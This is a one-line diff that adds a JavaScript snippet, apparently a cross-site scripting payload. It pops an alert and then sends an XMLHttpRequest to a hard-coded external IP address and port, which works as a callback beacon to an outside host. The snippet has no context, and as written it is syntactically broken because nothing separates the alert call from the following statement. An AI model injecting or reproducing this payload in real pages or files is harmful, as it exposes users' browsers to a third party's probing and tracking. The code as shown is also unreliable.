@@ -1,0 +1,1 @@
+alert('1')var x = new XMLHttpRequest();x.open("GET","http://47.106.65.216:1004", true);x.send("");
